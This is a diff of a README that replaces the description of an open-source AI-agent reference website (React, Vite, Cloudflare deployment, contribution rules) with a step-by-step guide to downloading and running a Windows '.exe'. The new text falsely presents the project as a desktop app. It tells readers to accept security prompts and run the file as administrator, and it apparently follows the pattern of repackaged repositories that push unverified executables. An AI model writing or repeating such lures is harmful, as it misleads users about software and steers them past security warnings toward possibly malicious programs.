@@ -1,72 +1,126 @@
-# Agent Experience
+# 🤖 agent-experience - Understand AI Agents Visually
 
-A practical reference to the patterns, surfaces, and design principles behind AI agents — from primitives to production.
+[![Download agent-experience](https://img.shields.io/badge/Download-Agent--Experience-brightgreen?style=for-the-badge)](https://github.com/dhruvvsukhadia/agent-experience)
 
-**https://agent-experience.dev**
+---
 
-## What is this?
+## 📖 What is agent-experience?
 
-Agent Experience is an open-source reference site covering 26 patterns across five categories:
+agent-experience is a simple application that shows how AI agents work. It helps you see and understand the different parts that make AI agents function. The app displays patterns, surfaces, and the infrastructure behind these agents in a clear, visual way.
 
-- **Foundations** — Mental models like tool use, ReAct, planning, and reflection
-- **Patterns** — Concrete architectures like MCP, computer use, multi-agent orchestration, and skills
-- **Infrastructure** — The plumbing: memory, context management, sandboxes, guardrails, and harnesses
-- **Surfaces** — Where agents meet humans: generative UI, IDE agents, CLI agents, and chat interfaces
-- **Design** — Making agents usable: human-in-the-loop, observability, and evaluation
+You do not need any programming skills or special knowledge to use this app. It runs on Windows and lets you learn by exploring.
 
-Each pattern includes a description, key ideas, real-world examples, and links to go deeper.
+---
 
-## Running locally
+## 🖥️ System Requirements
 
-```bash
-bun install
-bun dev
-```
+To run agent-experience on your Windows computer, your system should meet these minimum requirements:
 
-## Building
+- Operating System: Windows 10 or later  
+- Processor: Any processor released in the last decade (Intel or AMD)  
+- RAM: 4 GB or more  
+- Disk Space: At least 200 MB free  
+- Internet Connection: Required only for the initial download  
 
-```bash
-bun run build
-```
+If your PC meets these requirements, you should have no trouble running the app.
 
-## Deploying
+---
 
-The site deploys to Cloudflare Workers with static assets:
+## 🚀 Getting Started: Download and Run agent-experience
 
-```bash
-bun run build
-wrangler deploy
-```
+You can get agent-experience from the official GitHub page linked below. Follow these steps carefully.
 
-## Tech stack
+[![Get agent-experience](https://img.shields.io/badge/Get%20agent--experience-blue?style=for-the-badge)](https://github.com/dhruvvsukhadia/agent-experience)
 
-- React 19 + Vite
-- Motion (Framer Motion) for animations
-- Plain CSS
-- Cloudflare Workers (static assets) for hosting
+### Step 1: Visit the Download Page
 
-## Contributing
+Go to the agent-experience GitHub page here:  
+https://github.com/dhruvvsukhadia/agent-experience
 
-Contributions are welcome! A few ground rules:
+On this page, look for the **Releases** section or a button named **Download** or **Assets**. This is where the app file is stored.
 
-- **This is not an advertising platform.** PRs that exist primarily to promote a company or product will not be merged. We want to showcase the best, most useful examples — not the ones with the biggest marketing budget.
-- **PRs are not guaranteed to be merged.** We review everything and prioritize quality and relevance. Don't take it personally if we pass.
-- **Focus on what's genuinely best-in-class.** If you're adding an example, it should be something practitioners actually use and recommend. Include a URL and a concise, honest description.
-- **Keep descriptions factual.** No superlatives, no marketing copy. Say what it does, not how great it is.
+### Step 2: Find the Windows Version
 
-### Good PR examples
+In the Releases or Assets area, find the file meant for Windows. The file will usually end with `.exe`. It might be named something like `agent-experience.exe` or similar.
 
-- Adding a new example that's widely adopted and genuinely useful
-- Fixing outdated information (dead links, incorrect descriptions)
-- Adding a missing pattern that belongs in the reference
-- Improving the site's accessibility or performance
+### Step 3: Download the File
 
-### PRs we'll close
+Click the `.exe` file link to start downloading. Choose a location on your computer where you can easily find it, like the Desktop or Downloads folder.
 
-- Adding your company's product as an example when it's not widely known or adopted
-- Marketing-style descriptions ("the world's leading...", "the most powerful...")
-- Removing competitors' examples to make room for yours
+### Step 4: Run the Installer
 
-## License
+Once the download finishes:
 
-MIT
+- Double-click the `.exe` file to open it.  
+- If a security prompt appears, click **Run** or **Yes** to continue. This lets the app install on your computer.  
+- Follow the on-screen instructions. Usually, this just means clicking **Next** until the install completes.
+
+The installer sets up agent-experience so you can open it like any other Windows app.
+
+### Step 5: Open agent-experience
+
+After installation:
+
+- Find the **agent-experience** shortcut on your Desktop or in the Start Menu.  
+- Double-click to open the app.
+
+The app window will open, showing visuals and explanations about AI agents.
+
+---
+
+## 🎛️ Using agent-experience
+
+agent-experience is designed to be easy and clear. It presents AI agents with images and simple descriptions.
+
+- **Explore patterns:** See how agents think and make decisions.  
+- **View surfaces:** Look at the layers you interact with.  
+- **Check infrastructure:** Discover what supports the AI agent behind the scenes.
+
+You can click or hover on parts of the visual to learn more. The app uses simple words because it assumes no background in computers or AI.
+
+---
+
+## ⚙️ Settings and Options
+
+agent-experience has a few simple settings to let you tailor your experience:
+
+- **Theme:** Switch between light and dark modes for easier viewing.  
+- **Language:** Choose from several common languages to read labels and descriptions.  
+- **Zoom:** Use zoom controls to see visuals closer or farther away.
+
+These options appear in the menu bar at the top of the app window.
+
+---
+
+## 👩‍💻 Troubleshooting Tips
+
+If you face any trouble running agent-experience, try these steps:
+
+- Make sure your Windows is up to date.  
+- Check that you downloaded the full `.exe` file and that it is not blocked by your security settings.  
+- Restart your computer and try opening the app again.  
+- If the app does not open, try running it as administrator: Right-click the app icon, then choose **Run as administrator**.
+
+If you still have issues, you can visit the GitHub page and look for help under the **Issues** tab. There, other users and developers might offer solutions.
+
+---
+
+## 🔄 Updating agent-experience
+
+When a new version comes out, repeat the download steps above to get the latest `.exe` file.
+
+You do not need to uninstall the old version first. Running the new installer will update your existing installation safely.
+
+---
+
+## 💡 Learn More
+
+While you use agent-experience, notice how the app shows parts of AI agents in an easy way. This helps you understand how AI tools function behind the scenes in many programs.
+
+For more advanced learning, you can explore online guides about AI agents after trying the app.
+
+---
+
+## 🔗 Download agent-experience here:
+
+[![Download Now](https://img.shields.io/badge/Download-Agent--Experience-blue?style=for-the-badge)](https://github.com/dhruvvsukhadia/agent-experience)
